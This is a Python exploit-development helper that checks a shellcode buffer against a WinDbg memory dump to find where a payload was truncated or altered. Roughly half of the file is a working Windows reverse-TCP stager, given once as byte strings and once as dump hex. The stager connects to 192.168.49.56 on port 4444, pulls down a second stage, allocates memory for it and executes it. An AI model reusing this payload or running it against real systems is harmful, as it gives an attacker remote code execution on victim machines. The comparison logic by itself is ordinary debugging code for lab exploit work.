import re

def load_shellcode(shellcode_code: str) -> bytes:
    namespace = {}
    exec(shellcode_code, {}, namespace)
    sc = namespace.get('shellcode')
    if not isinstance(sc, (bytes, bytearray)):
        raise ValueError("Variable 'shellcode' of type bytes not found")
    return bytes(sc)

def parse_windbg_dump(dump: str) -> bytes:
    byte_array = []
    for line in dump.splitlines():
        m = re.match(r'^[0-9A-Fa-f]{8}\s+([0-9A-Fa-f \-]+?)\s{2}', line)
        if not m:
            continue
        hex_region = m.group(1)
        pairs = re.findall(r'[0-9A-Fa-f]{2}', hex_region)
        byte_array.extend(int(h, 16) for h in pairs)
    return bytes(byte_array)

def compare_shellcode(shellcode: bytes, memory: bytes):
    print(f"[i] Shellcode: {len(shellcode)} bytes, Dump: {len(memory)} bytes")
    min_len = min(len(shellcode), len(memory))
    for i in range(min_len):
        if shellcode[i] != memory[i]:
            print(f"[!] Mismatch at offset {i}: shellcode=0x{shellcode[i]:02x} vs memory=0x{memory[i]:02x}")
            print(f"[!] Payload is interrupted at position {i}")
            return
    if len(memory) < len(shellcode):
        missing = len(shellcode) - len(memory)
        print(f"[!] Memory dump is shorter than the shellcode.")
        print(f"[!] {missing} bytes are missing after offset {min_len}.")
    else:
        print("[+] All shellcode bytes are present in memory (or memory is longer).")

if __name__ == "__main__":

    shellcode_code = r'''
shellcode = b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
shellcode += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f"
shellcode += b"\xb7\x4a\x26\x31\xff\x8b\x72\x28\x31\xc0\xac"
shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
shellcode += b"\x49\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57"
shellcode += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
shellcode += b"\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\x85\xc9"
shellcode += b"\x74\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
shellcode += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
shellcode += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
shellcode += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
shellcode += b"\x0a\x68\xc0\xa8\x31\x38\x68\x02\x00\x11\x5c"
shellcode += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
shellcode += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
shellcode += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
shellcode += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
shellcode += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shellcode += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
shellcode += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
shellcode += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
shellcode += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
shellcode += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
shellcode += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
shellcode += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
shellcode += b"\xff\xd5"
'''

    windbg_dump = """
45402e59  fc e8 8f 00 00 00 60 89-e5 31 d2 64 8b 52 30 8b  ......`..1.d.R0.
45402e69  52 0c 8b 52 14 0f b7 4a-26 31 ff 8b 72 28 31 c0  R..R...J&1..r(1.
45402e79  ac 3c 61 7c 02 2c 20 c1-cf 0d 01 c7 49 75 ef 52  .<a|., .....Iu.R
45402e89  8b 52 10 8b 42 3c 57 01-d0 8b 40 78 85 c0 74 4c  .R..B<W...@x..tL
45402e99  01 d0 50 8b 48 18 8b 58-20 01 d3 85 c9 74 3c 31  ..P.H..X ....t<1
45402ea9  ff 49 8b 34 8b 01 d6 31-c0 c1 cf 0d ac 01 c7 38  .I.4...1.......8
45402eb9  e0 75 f4 03 7d f8 3b 7d-24 75 e0 58 8b 58 24 01  .u..}.;}$u.X.X$.
45402ec9  d3 66 8b 0c 4b 8b 58 1c-01 d3 8b 04 8b 01 d0 89  .f..K.X.........
45402ed9  44 24 24 5b 5b 61 59 5a-51 ff e0 58 5f 5a 8b 12  D$$[[aYZQ..X_Z..
45402ee9  e9 80 ff ff ff 5d 68 33-32 00 00 68 77 73 32 5f  .....]h32..hws2_
45402ef9  54 68 4c 77 26 07 89 e8-ff d0 b8 90 01 00 00 29  ThLw&..........)
45402f09  c4 54 50 68 29 80 6b 00-ff d5 6a 0a 68 c0 a8 31  .TPh).k...j.h..1
45402f19  38 68 02 00 11 5c 89 e6-50 50 50 50 40 50 40 50  8h...\..PPPP@P@P
45402f29  68 ea 0f df e0 ff d5 97-6a 10 56 57 68 99 a5 74  h.......j.VWh..t
45402f39  61 ff d5 85 c0 74 0a ff-4e 08 75 ec e8 67 00 00  a....t..N.u..g..
45402f49  00 6a 00 6a 04 56 57 68-02 d9 c8 5f ff d5 83 f8  .j.j.VWh..._....
45402f59  00 7e 36 8b 36 6a 40 68-00 10 00 00 56 6a 00 68  .~6.6j@h....Vj.h
45402f69  58 a4 53 e5 ff d5 93 53-6a 00 56 53 57 68 02 d9  X.S....Sj.VSWh..
45402f79  c8 5f ff d5 83 f8 00 7d-28 58 68 00 40 00 00 6a  ._.....}(Xh.@..j
45402f89  00 50 68 0b 2f 0f 30 ff-d5 57 68 75 6e 4d 61 ff  .Ph./.0..WhunMa.
45402f99  d5 5e 5e ff 0c 24 0f 85-70 ff ff ff e9 9b ff ff  .^^..$..p.......
45402fa9  ff 01 c3 29 c6 75 c1 c3-bb f0 b5 a2 56 6a 00 53  ...).u......Vj.S
45402fb9  ff d5
"""

    sc_bytes  = load_shellcode(shellcode_code)
    mem_bytes = parse_windbg_dump(windbg_dump)
    compare_shellcode(sc_bytes, mem_bytes)
